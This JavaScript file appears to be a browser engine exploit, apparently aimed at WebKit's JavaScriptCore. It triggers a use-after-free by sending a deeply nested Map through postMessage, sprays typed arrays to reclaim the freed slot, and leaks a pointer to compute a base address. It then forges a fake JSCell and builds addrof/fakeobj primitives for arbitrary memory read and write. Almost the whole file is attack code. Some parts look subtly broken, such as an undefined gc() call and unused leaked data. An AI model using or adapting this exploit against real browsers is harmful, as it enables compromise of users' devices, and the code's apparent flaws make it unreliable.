import { Int } from "./module/int64.mjs";
import { Memory } from "./module/mem.mjs";
import { KB, MB } from "./module/offset.mjs";
import { BufferView } from "./module/rw.mjs";
import { die, DieError, log, clear_log, sleep, hex, align } from "./module/utils.mjs";
import * as off from "./module/offset.mjs";
import * as config from "./config.mjs";



const UAF_SIZE = off.size_strimpl + off.size_inline;
const SPRAY_COUNT = 0x400;

function spray(count, size) {
  const arr = [];
  for (let i = 0; i < count; i++) {
    const v = new Uint8Array(size);
    v[0] = 0x41;
    arr.push(v);
  }
  return arr;
}

function triggerUAF(depth) {
  let root = new Map();
  let cur = root;
  const markerArr = [];
  for (let i=0;i<100;i++) markerArr.push(new Date(0xffff));
  for (let i=0;i<depth;i++) {
    const m = new Map();
    cur.set(new Date(i), [m, markerArr]);
    cur = m;
  }
  return root;
}

async function doUAF(depth) {
  const obj = triggerUAF(depth);
  let recv;
  const p = new Promise(r => addEventListener('message', e=>{recv=e.data; r();},{once:true}));
  postMessage(obj, location.origin);
  await p;
  return recv;
}

function findCorrupted(buffers) {
  for (let i=0;i<buffers.length;i++) {
    if (buffers[i][0] !== 0x41) return {buf:buffers[i], idx:i};
  }
  die("No corrupted buffer");
}

async function main() {

  	addEventListener('error', event => {
    const reason = event.error;
    alert(
        'Unhandled error\n'
        + `${reason}\n`
        + `${reason.sourceURL}:${reason.line}:${reason.column}\n`
        + `${reason.stack}`
    );
    return true;
});

addEventListener('unhandledrejection', event => {
    const reason = event.reason;
    alert(
        'Unhandled rejection\n'
        + `${reason}\n`
        + `${reason.sourceURL}:${reason.line}:${reason.column}\n`
        + `${reason.stack}`
    );
});

    log(`[+] START`);

  const pre = spray(SPRAY_COUNT, UAF_SIZE);
  const leaked = await doUAF(1600);
  gc(); await sleep();
  const buffers = spray(SPRAY_COUNT, UAF_SIZE);
  const {buf, idx} = findCorrupted(buffers);
  log(`[+] Reclaimed slot at index ${idx}`);

  const dv = new DataView(buf.buffer);
  const leakPtr = dv.getBigUint64(off.strimpl_inline_str, true);
  log(`[+] Leaked pointer: ${hex(leakPtr)}`);

  const KNOWN = BigInt(off.heap_slide);
  const base = leakPtr - KNOWN;
  log(`[+] Computed base: ${hex(base)}`);

  const fake = new Uint8Array(UAF_SIZE);
  const fv = new DataView(fake.buffer);
  fv.setBigUint64(0, base + BigInt(off.js_cell_header), true);
  fv.setBigUint64(off.js_butterfly, base + BigInt(off.butterfly_data), true);
  fv.setBigUint64(off.js_butterfly - 0x10, 7n, true);
  fv.setUint32(off.js_butterfly - 8, 1, true);
  fv.setUint32(off.js_butterfly - 4, 1, true);

  new Uint8Array(buf).set(new Uint8Array(fake));
  log("[+] Fake JSCell written");

  const bv = new BufferView(buf.buffer);
  const fakeArr = bv.readU64(off.js_butterfly);

  function addrof(obj) {
    bv.writeU64(off.js_butterfly - 0x10, Memory.toValues(obj));
    return bv.readU64(off.js_butterfly - 0x10);
  }
  function fakeobj(addr) {
    bv.writeU64(off.js_butterfly, addr);
    return fakeArr;
  }

  const testAddr = addrof(buf);
  log('[+] addrof(buf)=', hex(testAddr));
  const view = fakeobj(testAddr + BigInt(0x100));
  log('[+] fakeobj success');

  clear_log();
  log('Arbitrary R/W ready!');
}

 main().catch(e => alert(e.message));

